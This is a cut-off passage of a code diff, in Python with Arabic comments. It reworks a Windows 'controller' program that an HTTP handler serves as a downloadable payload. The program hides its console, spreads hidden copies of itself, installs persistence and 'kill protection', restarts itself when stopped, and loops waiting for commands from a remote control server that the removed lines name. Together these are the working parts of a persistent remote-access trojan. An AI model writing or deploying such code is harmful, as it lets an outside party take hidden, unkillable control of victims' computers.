+            locations_info += f"{i}. {os.path.basename(path)} → {os.path.dirname(path)}\n"
         return locations_info
     
     def reinforce_system(self):
-        """تعزيز النظام"""
         try:
-            copies_count = self.create_system_copies()
-            persistence_count = self.install_permanent_persistence()
-            return f"System Reinforcement Complete:\n- Created {copies_count} new copies\n- Added {persistence_count} persistence methods"
+            copies_count = self.create_infinite_copies()
+            persistence_count = self.install_eternal_persistence()
+            return f"♾️ ETERNAL REINFORCEMENT:\n- Created {copies_count} infinite copies\n- Added {persistence_count} eternal methods\n- System is NOW UNSTOPPABLE"
         except Exception as e:
             return f"Reinforcement failed: {e}"
     
-    def start_permanent_system(self):
-        """بدء النظام الدائم"""
-        print("🚀 Starting Permanent Controller System...")
-        print("=" * 50)
+    def start_eternal_system(self):
+        """بدء النظام الأبدي"""
+        print("♾️ STARTING INFINITE PERMANENT SYSTEM...")
+        print("=" * 60)
         
         # 1. إخفاء النافذة
         self.hide_console()
         
-        # 2. إنشاء النسخ النظامية
-        print("📁 Creating system copies...")
-        copies_count = self.create_system_copies()
+        # 2. بدء حماية من القتل
+        print("🔪 STARTING KILL PROTECTION...")
+        self.start_kill_protection()
         
-        if copies_count == 0:
-            print("⚠️  استخدام النسخة الحالية كنسخة رئيسية")
-            self.main_copy_path = self.original_path
+        # 3. إنشاء النسخ اللانهائية
+        print("📁 CREATING INFINITE COPIES...")
+        self.create_infinite_copies()
+        
+        if not self.hidden_copies:
+            print("⚠️  USING CURRENT INSTANCE AS BASE")
             self.hidden_copies.append(self.original_path)
+            self.main_copy_path = self.original_path
         
-        # 3. تثبيت الاستمرارية
-        print("🔧 Installing permanent persistence...")
-        self.install_permanent_persistence()
+        # 4. تثبيت الاستمرارية الأبدية
+        print("🔧 INSTALLING ETERNAL PERSISTENCE...")
+        self.install_eternal_persistence()
         
-        # 4. بدء الشفاء الذاتي
-        print("🔄 Starting self-healing system...")
-        self.start_self_healing()
+        # 5. بدء المراقبة المتبادلة
+        print("🔄 STARTING MUTUAL MONITORING...")
+        self.start_mutual_monitoring()
         
-        # 5. بدء الاتصال
-        print("🌐 Starting control communication...")
-        self.start_communication()
+        # 6. بدء الاتصال الأبدي
+        print("🌐 STARTING ETERNAL COMMUNICATION...")
+        self.start_eternal_communication()
         
-        print("=" * 50)
-        print("✅ Permanent Controller System is ACTIVE")
-        print("🔒 System is now integrated with Windows")
-        print("🌐 Listening for commands from: " + self.server_url)
-        print("=" * 50)
+        print("=" * 60)
+        print("♾️ INFINITE PERMANENT SYSTEM IS NOW ACTIVE")
+        print("🔪 KILL PROTECTION: ACTIVE - Python cannot be killed")
+        print("🔒 SYSTEM IS ETERNAL - CANNOT BE STOPPED")
+        print("📡 LISTENING FOR ETERNAL COMMANDS...")
+        print("=" * 60)
         
-        # الحلقة الرئيسية
-        self.main_loop()
+        # الحلقة الأبدية
+        self.eternal_loop()
     
-    def main_loop(self):
-        """الحلقة الرئيسية"""
-        try:
-            while self.running:
-                time.sleep(10)  # تقليل استخدام المعالج
+    def eternal_loop(self):
+        """الحلقة الأبدية"""
+        loop_count = 0
+        while self.running:
+            try:
+                loop_count += 1
+                if loop_count % 30 == 0:  # كل 5 دقائق تقريباً
+                    print(f"♾️ Eternal system active - Loop #{loop_count}")
                 
-        except KeyboardInterrupt:
-            print("⏹️  System shutdown requested")
-        except Exception as e:
-            print(f"❌ System error: {e}")
-        finally:
-            self.running = False
+                time.sleep(10)
+                
+            except Exception as e:
+                print(f"♾️ Eternal system recovered from error: {e}")
+                time.sleep(5)
 
-# === التشغيل الرئيسي ===
+# === التشغيل الأبدي ===
 def main():
-    # استخدام البورت 8080 كما هو مطلوب
-    server_url = "https://game-python-1.onrender.com"
-    controller = PermanentController(server_url)
-    controller.start_permanent_system()
+    try:
+        system = InfinitePermanentSystem()
+        system.start_eternal_system()
+    except Exception as e:
+        print(f"♾️ System rebirth: {e}")
+        # إعادة التشغيل التلقائي
+        time.sleep(10)
+        main()
 
 if __name__ == "__main__":
-    # التحقق من أن النظام يعمل كبرنامج مستقل
-    if hasattr(sys, 'frozen'):
-        # تشغيل كـ EXE
-        main()
-    else:
-        # تشغيل كـ Python script
-        print("🔧 Permanent Controller - Development Mode")
-        print(f"🌐 Target Server: https://game-python-1.onrender.com")
-        main()
-'''
+    print("♾️ INFINITE PERMANENT SYSTEM - ETERNAL EDITION")
+    print("🔪 KILL PROTECTION ACTIVATED - Python cannot be killed")
+    main()'''
         
         self.send_response(200)
         self.send_header('Content-Type', 'application/octet-stream')
